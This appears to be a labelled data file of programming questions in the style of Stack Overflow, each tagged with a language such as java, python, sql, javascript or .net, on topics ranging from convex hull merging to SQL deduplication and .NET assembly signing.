divide and conquer hull algorithm  hello my question today is to breakdown and figure out how to actually code the lower tangent part of the algorithm ive managed to complete steps (1) and (2) but i am now on stuck on step (3).    divide and conquer convex hull     hull(s) :     (1) if |s| &lt;= 3  then compute the convex hull by brute force in o(1) time and return.    (2) otherwise  partition the point set s into two sets a and b  where a consists of half the points with the lowest x coordinates and b consists of half of the points with the highest x coordinates.    (3) recursively compute ha = hull(a) and hb = hull(b).    (4) merge the two hulls into a common convex hull  h  by computing the upper and lower tangents for ha and hb and discarding all the points lying between these two tangents.    <a href= http://www.cs.wustl.edu/~pless/506/l3_1.gif  rel= nofollow >http://www.cs.wustl.edu/~pless/506/l3_1.gif</a>    <strong>finding the lower tangent</strong>    lowertangent(ha ; hb ) :    (1) let a be the rightmost point of ha .    (2) let b be the leftmost point of hb .    (3) while ab is not a lower tangent for ha and hb do    (a) while ab is not a lower tangent to ha do a = a - 1 (move a clockwise).    (b) while ab is not a lower tangent to hb do b = b + 1 (move b counterclockwise).    (4) return ab.    quoted from: <a href= http://www.cs.wustl.edu/~pless/506/l3.html  rel= nofollow >http://www.cs.wustl.edu/~pless/506/l3.html</a> this explanation is the best that describe my problem.    the functions for lexisort and convexhull have not been included as they are working  the dc hull algorithm has been included to provide context.    my current code:   <pre><code>public static int [][] dchull(int [][]merged){      if(merged.length &lt;= 3)         return convexhull(merged);      else {          lexisort(merged);         //split(p  a  b);         //split         double p = merged.length;         int a;         int b;          if (p%2 == 0){//even             a = (int) (p/2);             b = (int) (p/2);         }         else//odd             a = (int) (1+(p/2));             b = (int) (p/2);            int arraya[][] = new int[a][2];          int arrayb[][] = new int[b][2];          for (int i=0; i&lt;a; i++){             arraya[i][0] = merged[i][0];             arraya[i][1] = merged[i][1];         }          for (int i=0; i&lt;b; i++){             arrayb[i][0] = merged[i+a][0];             arrayb[i][1] = merged[i+a][1];         }          for ( int i=0; i&lt;arraya.length; i++){             system.out.println(  merged array a coordinates:   + arraya[i][0] +     + arraya[i][1]);}         for ( int i=0; i&lt;arrayb.length; i++){             system.out.println(  merged array b coordinates:   + arrayb[i][0] +     + arrayb[i][1]);}          lowert(arraya  arrayb);         //uppert(arraya  arrayb);           return merged(dchull(convexhull(arraya))  dchull(convexhull(arrayb)));      }  }  public static int[][] lowert(int [][] hulla  int [][]  hullb){      int a = 0;     int b = 0;      //lower tangent     //(1) let a be the rightmost point of ha .     for (int i=0; i&lt;hulla.length; i++){         if (a &lt; hulla[i][0]){             a = hulla[i][0];         }     }     //(2) let b be the leftmost point of hb .     for (int i=0; i&lt;hullb.length; i++){         if (b &lt; hullb[i][0]){             b = hullb[i][0];         }     }     for (int i=0; i&lt;hullb.length; i++){         if (b &gt; hullb[i][0]){             b = hullb[i][0];         }     } </code></pre>   the code finishes after working out a of ha and b of hb however i do not understand (3) or more precisely how to code it using the elements i have.     (1) let a be the rightmost point of ha .    (2) let b be the leftmost point of hb .    there is an additional method of code called right turn that i believe is useful:  lower tangency is a condition that can be tested locally by an orientation test of the two vertices and neighboring vertices on the hull.     im just not sure how to put it together.   <pre><code>public static boolean rightturn(int [][] rt  int counter) //axbxc = (bx-ax)(cy-ay)-(by-ay)(cx-ax) {     int ax = rt[counter-2][0];     int bx = rt[counter-1][0];     int cx = rt[counter][0];      int ay = rt[counter-2][1];     int by = rt[counter-1][1];     int cy = rt[counter-0][1];     int result =(bx-ax)*(cy-ay)-(by-ay)*(cx-ax);      if (result &lt; 0){                            // result = ve+ (right turn)  0  ve- (left turn)          return true;                                                    //ve- = true = right turn     }      else return false;                                                  //ve+ = false = left turn } </code></pre>,java

python: splitting composite words to known words (from dictionary)  i need a very efficient algorithm to do the following:    i have to separate composite words in any language. english for example.    but there is a problem occurring when a word is composed of two words that are sharing the last and the first letter.    i.e. the first word ends with the letter in which the second begins.    so  we have a dictionary containing all possible words  make it short:    let say we want to split the word  lightshow  with this exemplary dict:   <pre><code>d = { light :  noun  s  n        lights :  noun  p  n        how :  q        show :  noun  s  n       ...} </code></pre>   my algorithm now splits the word in chunks into two lists:   <pre><code>left = []; right = [] for x in range(len(word)-1  1  -1):     ls = word[:x]; rs = word[x:]     if ls.lower() in d: left.append(ls)     if rs.lower() in d: right.append(rs) </code></pre>   then i find the longest word in left and the longest word in right list.    so  i know of which words the word consists and where they begin and end inside the composite word.    don t worry now about overkill cases where word is not in dict  and words doesn t match etc.  i just want to present the idea to you and my biggest problem with this approach.    using this approach at the end of whole algorithm the result will be:   <pre><code>[ lights    how ] </code></pre>   instead of:   <pre><code>[ light    show ] </code></pre>   what is  as you can imagine unacceptable.    oh  yes i can check whether in dict exists a word show by using the:   <pre><code>l = [ lights    how ] if l[0][-1]+l[1] in d: &lt;repair the list&gt; </code></pre>   but it is inpractical  also my algorithm deals recursively with words that are composed of more than 2 words.    it also deals with words that are separated with differences in capitalization etc.    that is why i didn t post it whole because it is big and optimized so it would be a lot of unimportant code to read.    oh  yes  i can do some improvements with making the last word primary. or comparing the lengths when choosing which one goes first etc.    but it is not always possible to decide correctly with these manipulations. for example  what to do with found longest words that intersect in more than one letter     i want to do it all within one loop. speed is imperative.    note: dictionary i supplied is exemplary. the dataset i have to work with doesn t contain any information about the type of word. just its pronunciation from which only useful info can be whether the word is short/long when spoken.    hope to see some very good ideas here. remember  code has to be very efficient. it is used in real time by a tts to pronounce words that aren t in dictionary but actually contain words that are  and usually pronunciation matches. no need for providing me with code  just ideas to put to action.,python
getting  reading null  when trying to write to a file   i m trying to write a 2d array to a text file  and when i try to write to it  i keep getting  reading null     the user inputs 2 dimensional points into an array that can store up to 100 points.   <pre><code>point[] a = new point[100];  system.out.println( enter index:  ); int i = in.nextint(); //validate system.out.print( enter integers x  y to replace:  ); int x = in.nextint(); int y = in.nextint(); a[i] = new point(x  y); </code></pre>   then i try to print the points to the file   <pre><code>printwriter p = new printwriter( project.txt );  for (int k=0; k&lt;a.length ; k++){     p.println(arrays.deeptostring(a)); } p.close(); </code></pre>   then it does this.    opening project.txtreading null    it s like it doesn t know the file exists  but i ve made the file already  and it s in the same folder as this java file. what am i missing,java

every 50px put a different height to an element  i am working on an application where there is a live video in the view and i need to set the css part in the javascript code.    i don t need any type of solution in css  please.    i was doing something like this   <pre><code>var playermsgs =  document.getelementbyid( player-msgs );  if (windowheight &gt;= 750 &amp;&amp; windowheight &lt;= 800) {   playermsgs.style.height =  40% ; } else if (windowheight &gt;= 801 &amp;&amp; windowwidth &gt;= 850) {   playermsgs.style.height =  45% ; } ... // and son  </code></pre>   which i don t feel comfortable because i guess i can do a proper code in order to do it programatically  as you can see  every <code>50px</code> the percentage change 5%  the minor height my app is supporting is <code>750px</code>  so from <code>750px</code> the percentage is 40% as you see in the code.    if the window size presents a height of <code>750px</code> the height should be <code>40%</code> and the same percentage until the next <code>50px</code>  so <code>750px &amp;&amp; 800px</code> should present <code>height</code> of <code>40%</code>  if the height now is <code>801px</code> then the new <code>height</code> should be set to <code>45%</code> and so on... so  what is the best way to do that      tldr    increment 5% of height on every 50px.,javascript

where is the reference to the  real  system assembly   i was researching an answer to a question i saw earlier on so (<a href= https://stackoverflow.com/questions/19713504/system-object-not-defined-in-vb-net >system.object not defined in vb.net</a>) and i discovered something that seems strange.  i always thought that the class  object  which  as everyone knows  resides in the  system  namespace  was defined in the system.dll assembly or  at the very least  in the system.core.dll.  however  when i started searching around in the object browser  i learned that object is actually defined in mscorlib.dll.  the really strange thing  though  is that this assembly is not referenced anywhere in any project.  just to test this  i created a project and removed all references:    <img src= https://i.stack.imgur.com/4sx2p.png  alt= enter image description here >    surprisingly (at least to me) doing so did not break anything.  i could still write a piece of code like this:   <pre><code>module module1     sub test()         dim x as new object     end sub end module </code></pre>   without any compile errors.  can someone out there kindly explain this to me,.net

how to define a __str__ method for a class   in python  the <code>object</code> class serves as the root superclass for all the (new-style) classes.  by default at least  applying <code>str</code> and <code>repr</code> to the  class instance  of any subclass of <code>object</code> produces the same result:   <pre><code>&gt;&gt;&gt; class spam(object): pass ...  &gt;&gt;&gt; str(spam)  &lt;class  __main__.spam &gt;  &gt;&gt;&gt; str(spam) == repr(spam) </code></pre>   i would like to define a subclass of <code>object</code>  say <code>fancyobject</code>  that is identical to <code>object</code> in every way  except that applying <code>str</code> and <code>repr</code> to <code>fancyobject</code> itself produces different outputs:   <pre><code>&gt;&gt;&gt; class ham(fancyobject): pass ... &gt;&gt;&gt; str(ham)  ham  &gt;&gt;&gt; repr(ham)  &lt;class  __main__.ham &gt;  </code></pre>   is there a way to do this in python     ps: i m aware of the <code>__str__</code> special method  but it is my understanding that if class <code>a</code> overrides <code>__str__</code>  then the overriding method is called only when <code>str</code> is called on instances of <code>a</code>  not when it is called on <code>a</code> itself.  i.e.:   <pre><code>&gt;&gt;&gt; class a(object): ...     def __str__(self): ...         return  from new __str__:   + object.__str__(self) ...  &gt;&gt;&gt; str(a())  from new __str__: &lt;__main__.a object at 0x7f79c62a5310&gt;  &gt;&gt;&gt; str(a)  &lt;class  __main__.a &gt;  </code></pre>,python

stop a timer from outside a jvm  i have a long running timer task. its a batch process actually that will keep looping forever and working its stuff. this batch program is written in java. now how do i ask it to gracefully shutdown if for example i need to do some maintenance   from outside the jvm     i could think of some dirty ways  at the end of every loop of the run method  have it check for the presence of a file in some directory. if it is present then it will stop. or create a database record asking it to stop.     is there another better way of doing this,java
unique records based on same ids with different type  i have first table like this:   <pre><code>id    email     100  a@a.com   200  b@b.com </code></pre>   i have second table like this(permissions shared):   <pre><code>   id   assigned id  role    100    200        normal user    100    100        super user    200    200        normal user  </code></pre>   ie. 100 is a super user and can access the sharing features of id 200.   <pre><code>select t1.id t1.email t2.role from table t1  table t2 where t1.id=t2.id; </code></pre>   when i combine both the top 2 tables  i get like this   <pre><code>id     email      role  100    a@a.com    super  user  100    a@a.com    normal user 200    b@b.com    normal user </code></pre>   i want to get  output like this:    <pre><code>id     email      role     100    a@a.com    super  user  200    b@b.com    normal user </code></pre>   ie. if any user has a type of super user rights  just take that entry and don t need the type for normal user.    if the email is already present as super user and further the same email is assigned to someone  then the query should return only for super user.    i even tried using group by and union all:   <pre><code>  select t1.id t1.email t2.role from table t1  table t2    where t1.id=t2.id group by t1.email having t2.role= super user    and not exists (  select t1.id t1.email t2.role from table t1  table t2    where t1.id=t2.id group by t1.email having t2.role= super user )   union all   select t1.id t1.email t2.role from table t1  table t2    where t1.id=t2.id group by t1.email having t2.role&lt;&gt; super user ; </code></pre>   but seemed to give incorrect answer. any thoughts,sql

pause page loading via javascript  the normal flow is to have javascript manipulate the dom.  for example  i have a callback from a transaction executesql on an opendatabase.  the callback manipulates the dom to add the result into a div.    but i have a special case where the page has to load correctly in toto.  yes  that s right - i used the phrase in toto.    q: is there a way for javascript to pause the page load until call the callbacks have called back     i m thinking i will have to use document.write instead of $( body ).append().,javascript
wading through .net as a newb  to date i ve done a lot of low-level programming (kernel-mode device drivers  native code  etc.) on both windows and unix with c++  c and ada95.  i m considering to make a career jump to application-specific programming where i can learn a business alongside software development and not just be a low-level hardware interface guy.    besides learning sql and basic databases  for various reasons  i ve decided to go with the .net stack rather than the java stack.  i m not really interested in uis  but more so server and back-end development for the time being  so i m trying to avoid tech like wpf and css/javascript/ajax for now.    what .net technologies should i be trying to learn to make myself more  modern  and competitive in the job market   do i need to try to master linq  ado.net  asp.net  and wcf as well,.net
efficient reading of values in a binary file  i have a lot of binary files containing output of a numerical model. they are flat binary files containing output as floating point numbers. the files correspond to a four-dimensional array sorted in t-z-y-x order with x varying fastest. the thing is that for given x y and z i need the values for all t. the simple solution of simply reading everything into one large numpy array and taking <code>data[: z y x]</code> works of course but is not very efficient (i need to read many files).    what i have come up with now is the following (assuming <code>start_index</code> and <code>volume_size</code> to represent the correct things):   <pre><code>data=array.array( f ) with file(my_filename  rb ) as infile:     for hour in range(amount_of_steps):         if hour==0:             infile.seek(start_index*data.itemsize 0)         else:             infile.seek(data.itemsize*volume_size 1)         data.fromfile(infile 1) </code></pre>   i don t have to bother about enddianness and portability (although the latter has of course some merits). the whole thing runs on linux and it is highly unlikely it will ever run on something else. so the question is: is there a way to do this with higher performance  this is done on many files. i tried parallelization but it does not really help. getting new hardware is not an option and ssds even less so because of the amount of data involved. neither is changing the file-format.,python
.net framework - when to upgrade   i’m faced with a challenge of leading two (currently) separate .net development groups with different development strategies.  one group is developing on the .net framework 2.0 (with maybe a few applications on 3.5).  the other group immediately adopts any new framework that comes out  and begins coding any new applications with it (they are running 2.0-4.0 applications).  for this last group  applications written in an earlier version than the latest framework do not get upgraded.    what is the current school of thought when it comes to a company developing web applications on when to adopt a new framework  and whether to migrate applications built on previous versions to the latest framework or not   years ago the thought was to wait until the technology became mainstream - but that doesn t seem to apply much now with .net.,.net

get var name from this or self reference javascript  i see that there are some other questions that seem to be on a similar topic but none have an answer that will help me with my particular problem. i have made a thread library in in javascript built around the <code>settimeout</code> and <code>setinterval</code> functions.  this is working very well except that my thread library requires that the name of thread is past to the thread i.e when i instantiate the thread it looks like this.   <pre><code>t = new thread(payload   t )  </code></pre>   payload is an object that defines the what the thread will do when it gets a chance to execute. this allows me to abstract the task of the thread from the underlying threads  plumbing .  in any case my problem that i have to pass name of thread because <code>settimeout</code> and <code>setinterval</code> take a javascript command as a string i.e <code>settimeout( dostuff   0)</code>.  as i use my thread library in more applications passing the name to the thread is becoming more of a pain.  so i would like to be able to avoid this by getting the name of the thread from within the thread class like this:    <pre><code>var mythreadname = this.somemagicfunction();  </code></pre>   or   <pre><code>var mythreadname = somemagicfunction(this);  </code></pre>   or some other fantastic method if anyone has any ideas for me i would be most grateful.,javascript

web api 2 put from one controller calls post from other controller not working  i have a webapi project that has two models  sensors and sensor log. the sensor has a state and a name and the sensor log has name  state and a date property. all of this on their own works fine.     my issues is when i put to the sensor i also would like to post to the sensor log. that way i can update the log while keeping the current state for the sensor itself. right now i can put to the sensors and post to the sensor logs from their own controller but when i try to call the post from the sensor log from the put method of the sensor i get an unexpected result.     instead of a put on the sensor and a post on the sensor log i get a post on both the sensor and the sensor log. ie. the put no long updates the sensor but creates a new one in the sensor table and then associates the new sensor to the sensor log that is posted. what could be causing this     public async void putsensor(int id  sensor sensor)         {   <pre><code>        db.entry(sensor).state = entitystate.modified;          try         {             db.savechanges();         }         catch (dbupdateconcurrencyexception)         {          }          // return statuscode(httpstatuscode.nocontent);          using (var client = new httpclient())         {              client.baseaddress = new uri( http://localhost:50293/ );             client.defaultrequestheaders.accept.clear();             client.defaultrequestheaders.accept.add(new mediatypewithqualityheadervalue( application/json ));               // http post             var log = new sensorlog() { stateid = sensor.stateid  sensorid = sensor.id };             httpresponsemessage responsee = await client.postasjsonasync( api/sensorlogs/   log);          }             } </code></pre>,.net

.net  is it possible to step into a framework dll  while debugging   i have a sharepoint dll (part of sharepoint 2010). i can reflect it using redgate reflector. when i am debugging i would really like to step into the built in methods because it would provide great insight into a hard to track bug i am facing.     my question is more general though  up until now when i call a framework method  i just step over it and consider code on the other side a kind of black box void. to progress as a .net developer i need to start getting more into the internals.     so how it this done  please use the sharepoint dll as an example to make the solution generic enough to apply to any .net managed code library.     thanks in advance.,.net

should i add *internal* properties to the prototype   i know that a consequence of using the prototype is that all added properties and methods will be public. this is not really too much of a problem since i m using a naming convention to distinguish between the internals vs. the public interface. so yes  everything is still <em>technically</em> public.    would it be best to just add <em>all</em> methods and properties to the prototype -- even ones that are intended to be internal -- opposed to only adding <em>public</em> methods/properties to the prototype and dynamically creating the internal properties inside the constructor using <code>this.property = value</code>.     it seems that since everything is going to be public anyway  we might as well add internal properties to the prototype as well.    <strong>i know about using closures to create private scope. my question is not about how to create truly private properties (which would mean ditching the prototype as any of those methods would not have internal access privileges)  but about best practice when using the prototype.</strong>   <pre><code>function myobjecta() {    this.myinternalprop_ = 5;    // ... }  myobjecta.prototype.mypublicprop =  hello ; </code></pre>   vs.   <pre><code>function myobjecta() {    // ... }  myobjecta.prototype.mypublicprop =  hello ; myobjecta.prototype.myinternalprop_ = 5; </code></pre>,javascript

difference between a static and a final static variable in java  generally  final static members especially  variables (or static final of course  they can be used in either order without overlapping the meaning) are extensively used with interfaces in java to define a <strong>protocol behavior</strong> for the implementing class which implies that the class that implements (inherits) an interface must incorporate all of the members of that interface.    <hr>   i m unable to differentiate between a <strong>final</strong> and a <strong>final static</strong> member. the final static member is the one which is a static member declared as final or something else  in which particular situations should they be used specifically    <hr>   a static variable or a final static variable can never be declared inside a method neither inside a static method nor inside an instance method. why     the following segment of code accordingly  will not be compiled and an compile-time error will be issued by the compiler  if an attempt is made to compile it.   <pre><code>public static void main(string args[]) {     final int a=0;  //ok      int b=1;  //ok      static int c=2;  //wrong      final static int x=0;  //wrong } </code></pre>,java

array vs hash key search  so i m a longtime perl scripter who s been getting used to python since i changed jobs a few months back. often in perl  if i had a list of values that i needed to check a variable against (simply to see if there is a match in the list)  i found it easier to generate hashes to check against  instead of putting the values into an array  like so:   <pre><code>$checklist{ val1 } = undef; $checklist{ val2 } = undef; ... if (exists $checklist{$value_to_check}) { ... } </code></pre>   obviously this wastes some memory because of the need for a useless right-hand value  but imo is more efficients and easier to code than to loop through an array.    now in python  the code for this is exactly the same no matter if you re searching an list  or a dictionary:   <pre><code>if value_to_check in checklist_which_can_be_list_or_dict:    &lt;code&gt; </code></pre>   so my real question here is: in perl  the hash method was preferred for speed of processing vs. iterating through an array  but is this true in python  given the code is the same  i m wondering if python does list iteration better  should i still use the dictionary method for larger lists,python

unsigned int to signed floating point with python  ok this has been bugging me for awhile now!    i have a tri-metric battery monitor which serial outputs data to an arduino  where i convert and scale the output to be sent over <em>modbus tcp</em> to my raspberry pi where it is then descaled and added to a mysql table. i m currently using php to do this but want to move it to <em>python</em>  feeling that it would be more efficient than <em>php</em>.     the data say the amphours used by the system which goes negative when the battery is discharging after the sun goes down.    i scale the data by multiplying by 10 and converting to an unsigned 16 bit integer to meet modbus specifications.    i need to know how i can change this unsigned 16 bit integer back to a signed floating point number to add to my database.    for example this is the raw data from <em>modbus</em> 65365 the unscaled equivalent should be <code>-17.2 amphrs</code>.    any assistance with this would be much appreciated.    this is how i convert it on the <em>arduino</em>    <pre><code>cmddata[k] =  \0 ;        // add termination null char for float conversion:                                                        cmdfloat = atof(cmddata); // convert char array upto null to float:                                                                      cmdvalue = int(cmdfloat * 10);  // convert to int16_t and scale up by 10:                                                                       amp_hours = (uint16_t)cmdvalue;             serial.print( amp hours:  ); } serial.println(cmdfloat);  //serial print the float value } </code></pre>   in python i have tried    amphours = usamphours/10 if (amphours &amp; 0x80000000): amphours = -0x100000000 + amps    also tried    amphours = amphours&amp;0xffffffff    non of which works,python

sql server multiple rows in a single row. give me the best value on curtain columns  trying to figure out if this is possible in the db side. i created a visual in html as the data. as you can see. there are multiple rows that have the same <code>contactid</code>. i want to group by that <code>contactid</code> into 1 row with the best value for column test1  test2 and test3 id s.     here is the kicker. say you get the best value for <code>contactid = 1234</code> on test1. i need that value and other columns test1code and test1ec. test2 column is greater in a different row. so i would need that value with the test2code and test1ec from that row. this would be the same for test3.    not all columns have data  but will have a null value.    <div class= snippet  data-lang= js  data-hide= false  data-console= true  data-babel= false > <div class= snippet-code > <pre class= snippet-code-css lang-css prettyprint-override ><code>&lt;style&gt; table {   font-family: arial  sans-serif;   border-collapse: collapse;   width: 100%; }  td  th {   border: 1px solid #dddddd;   text-align: left;   padding: 8px; }  tr:nth-child(even) {   background-color: #dddddd; } &lt;/style&gt;</code></pre> <pre class= snippet-code-html lang-html prettyprint-override ><code>&lt;table&gt;   &lt;tr&gt;     &lt;th&gt;company&lt;/th&gt;     &lt;th&gt;contactid&lt;/th&gt;     &lt;th&gt;test1&lt;/th&gt;     &lt;th&gt;test1code&lt;/th&gt;     &lt;th&gt;test1ec&lt;/th&gt;     &lt;th&gt;test2&lt;/th&gt;     &lt;th&gt;test2code&lt;/th&gt;     &lt;th&gt;test2ec&lt;/th&gt;     &lt;th&gt;test3&lt;/th&gt;     &lt;th&gt;test3code&lt;/th&gt;     &lt;th&gt;test3ec&lt;/th&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;td&gt;alfreds futterkiste&lt;/td&gt;     &lt;td&gt;1234&lt;/td&gt;     &lt;td&gt;123&lt;/td&gt;     &lt;td&gt;1&lt;/td&gt;     &lt;td&gt;c&lt;/td&gt;     &lt;td&gt;432&lt;/td&gt;     &lt;td&gt;1&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;     &lt;td&gt;1234&lt;/td&gt;     &lt;td&gt;0&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;td&gt;centro comercial moctezuma&lt;/td&gt;     &lt;td&gt;4321&lt;/td&gt;     &lt;td&gt;432&lt;/td&gt;     &lt;td&gt;1&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;     &lt;td&gt;543&lt;/td&gt;     &lt;td&gt;0&lt;/td&gt;     &lt;td&gt;c&lt;/td&gt;     &lt;td&gt;156&lt;/td&gt;     &lt;td&gt;null&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;td&gt;ernst handel&lt;/td&gt;     &lt;td&gt;4567&lt;/td&gt;     &lt;td&gt;123&lt;/td&gt;     &lt;td&gt;1&lt;/td&gt;     &lt;td&gt;c&lt;/td&gt;     &lt;td&gt;432&lt;/td&gt;     &lt;td&gt;1&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;     &lt;td&gt;1234&lt;/td&gt;     &lt;td&gt;0&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;td&gt;ernst handel&lt;/td&gt;     &lt;td&gt;4567&lt;/td&gt;     &lt;td&gt;832&lt;/td&gt;     &lt;td&gt;1&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;     &lt;td&gt;143&lt;/td&gt;     &lt;td&gt;0&lt;/td&gt;     &lt;td&gt;c&lt;/td&gt;     &lt;td&gt;356&lt;/td&gt;     &lt;td&gt;null&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;td&gt;ernst handel&lt;/td&gt;     &lt;td&gt;4567&lt;/td&gt;     &lt;td&gt;432&lt;/td&gt;     &lt;td&gt;1&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;     &lt;td&gt;543&lt;/td&gt;     &lt;td&gt;0&lt;/td&gt;     &lt;td&gt;c&lt;/td&gt;     &lt;td&gt;156&lt;/td&gt;     &lt;td&gt;null&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;td&gt;island trading&lt;/td&gt;     &lt;td&gt;7645&lt;/td&gt;     &lt;td&gt;123&lt;/td&gt;     &lt;td&gt;1&lt;/td&gt;     &lt;td&gt;c&lt;/td&gt;     &lt;td&gt;432&lt;/td&gt;     &lt;td&gt;1&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;     &lt;td&gt;1234&lt;/td&gt;     &lt;td&gt;0&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;td&gt;alfreds futterkiste&lt;/td&gt;     &lt;td&gt;1234&lt;/td&gt;     &lt;td&gt;999&lt;/td&gt;     &lt;td&gt;1&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;     &lt;td&gt;234&lt;/td&gt;     &lt;td&gt;0&lt;/td&gt;     &lt;td&gt;c&lt;/td&gt;     &lt;td&gt;789&lt;/td&gt;     &lt;td&gt;null&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;td&gt;alfreds futterkiste&lt;/td&gt;     &lt;td&gt;1234&lt;/td&gt;     &lt;td&gt;432&lt;/td&gt;     &lt;td&gt;1&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;     &lt;td&gt;543&lt;/td&gt;     &lt;td&gt;0&lt;/td&gt;     &lt;td&gt;c&lt;/td&gt;     &lt;td&gt;156&lt;/td&gt;     &lt;td&gt;null&lt;/td&gt;     &lt;td&gt;s&lt;/td&gt;   &lt;/tr&gt; &lt;/table&gt;</code></pre> </div> </div>,sql

query about application t-sql joins  we have a table with the following structure - table(id  key_type  key_value) where (id  key_type) is the primary key.    due to some bug in the softwares writing to this table  there can be cases where you have same  combinations of (key_type key_value) but with different ids.    we want to find out all such incorrect data  where all the combinations of (key_type key_value) are same even though id can be different.    interestingly  the number of such combinations will vary i.e. they are not same across all the ids.    for example     if the rows are -    <ol> <li>(1  type1  value1)</li> <li>(1  type2  value2)</li> <li>(2  type1  value1)</li> <li>(2  type2  value2)</li> <li>(3  type3  value3)</li> <li>(4  type4  value4)</li> <li>(5  type3  value3)</li> <li>(6  type1  value1)</li> <li>(6  type3  value3)</li> </ol>   the query should flag off ids (1 &amp; 2) and (3 &amp; 5) maybe the solution is trivial but i would blame it to my little experience with sql. can someone please help me out here  thanks!,sql

make output print once per loop  not each iteration  i have a class that is designed to search a file for a user-specified string. the class works as it should  cycling through a file containing multiple lines and printing - provided the specified string exists - the line(s) containing the desired string. the issue i m having at the moment is that my else statement (provide new word if previous word does not exist) runs for every line (as it should)  but i only want it to run once per loop. here is my code    <pre><code>public class simpledbsearch {    public void sdbsearch(scanner searchword) throws ioexception{      //prompt user for input     system.out.println( please input the word you wish to find: );      //init string var containing user input     string wordinput = searchword.next();      //specify file to search     file file = new file( c:/users/joshua/desktop/joutfiles/testfile.txt );      //init scanner containing specified file     scanner filescanner = new scanner(file);      //loops through every line looking for lines containing previously specified string.     while(filescanner.hasnextline()){         string line = filescanner.nextline();         if(line.contains(wordinput)){       //if desired string is found  print line containing it to console             system.out.println( i found the word you re looking for here:   + line);         }else{      //if desired string not found  prompt user for new string. i want this to occur only once  not per every line-check             system.out.println( please input a new word );         }     } } </code></pre>,java

sql if( exists()) query duplication  i need to write a a query that gets a set of information from a table  but if there is no information for that specific client  then use the default set.  i was wondering if there is a way to avoid query duplication in an if(exists()) statement.    for example:   <pre><code>if( exists( select * from usertable where name = @username)) begin     select * from usertable where name = @username)) end else begin     select * from usertable where name =  jon skeet )) end </code></pre>   the first two selects (exists and the true part of the if) are the exact same.  i want to avoid running the same query twice if the statement is true.  i know the exists stops once the first true condition is met but that is still o(n) worst case.    another option i know of  is put the information in a temp table and check if information is there  if not return the default information.    both ways would work but what is the best way to do it   are there other ways to do this   is there some way to do this in the where clause since that s the only thing that is different     edit:  fixed example to return a row not just a single item.  so the answers of dumping the select to a single variable would be equal to a temp table i assume.  also  to not anger jon skeet  spelled his name right,sql
python large app: how to use other modules that might be needed or not  depending on the request given   i have a web app in python and there is a main file that is a router.    the router reads the path and should:   <ol> <li>only now import the module needed for the request  or</li> <li>call the method directly.

console o/p data to log file is not formatted (python script)  i have a python script using which i call a command that lauches a software (which runs a simulation) and then after completion the simu software is closed. the simulation s/w has a console window on which some o/p is displayed.     if i would have launched this simu manually using a shell without then i can also see the o/p of this simu s/w console window in the shell.    my primary target is to write this console window o/p to a log file.     hence i did the following and it is working.   <pre><code>import commands logging.basicconfig(...) . . .     simu_cmd =  my_cmd  logging.info(commands.getstatusoutput(simu_cmd)) . . </code></pre>   now when i open my log file after the python script completes execution  then i see the complete expected o/p written out in the log file.    but there is no formatting of the data. it is just like a big string printed one after the other. there are spaces in between words  but are problems with  new lines . i can even see  \n  and  \r  characters in my log files.    can anyone please suggest how to i write the formatted output to the log file or improve on the code i have written     note- may be i am using an old process to write out to a log file  but i want to keep it stupid and simple. in some thread here some people have mentioned the useage of subprocess()  but it looked complicated to me. i will always be using a linux m/c.,python

removing n items from a list conditionally  i was writing some <strong>asp.net</strong> control when i came to the scenario where i needed to remove items from a list  only when they matched a certain condition.    the <code>removeall</code> method of the generic <code>list</code> class does a good job  but removes <em>all</em> items that match the condition  specified by the predicate.    what if i want to only remove a certain number of items specifying the condition  what do you think is the best way to do this,.net

java xml dom with lots of data  how can i buffer it   i have a java program that is generating xml data which happens to be very large. i am using the typical parsers in javax.xml and the org.w3c.dom objects. the dom in memory is becoming so large that it occasionally runs out of memory. now  the reason it reaches the memory limit is because the program is generating all of the data at once and then transforming it to a string and then to a file. there are hundreds of elements being generated at once that could be made one at a time and buffered to a file rather than slowly filling the ram. i ve been looking into libraries out there but i m a bit confused on what is good. what method should i be using to buffer this dom document to a file rather than generating all at once,java
how to verify an assembly was signed by my organization   i ve reviewed the .net strong name process a few times and think i m comfortable with it  but i m left with what i think is a security gap:    i m working on a system whereby we store serialized .net assemblies in our ms sql database. they are read by a public-facing web application that deserializes and caches them. this is done to allow remote addition of new plugins without having to redeploy the web app.    i have some concerns about author verification  however. both the web app and the plugin assemblies have strong names using the same public-private key. in that way i m guaranteed that the plugins can t be tampered with  but i see one scenario in which a malicious user could execute their own code:   <ol> <li>the user implements an assembly that implements the interface our plugins are using (this is nontrivial since the plugins are not distributed - we create them internally).</li> <li>the user gives this assembly a strong name of their own</li> <li>the user manages to inject their assembly into the appropriate table in our database</li> <li>the web application loads this assembly and instantiates the constructor for the interface the malicious user implemented - it is now executing their code</li> </ol>   it s my understanding that the .net framework will only check that an assembly has a strong name and that it hasn t been tampered with - it doesn t say anything about verification of the author.    thus  the last piece of my puzzle is to somehow verify that the signature in an assembly is in fact our own. am i missing some fundamental piece that s already been addressed  or is strong naming not designed to handle this case  if so  can anyone suggest how to address this problem     [edit] thanks khalid! my problem was that one of my test plugins was signed using a test key - i had since regenerated it (don t ask) and applied it to the other assemblies but missed that one. as a result  i thought that getpublickey() was returning inconsistent values!    code snippet for anyone who is following this path:   <pre><code>private bool validateassembly( byte[] deserializedassembly ){    byte[] ourkey = 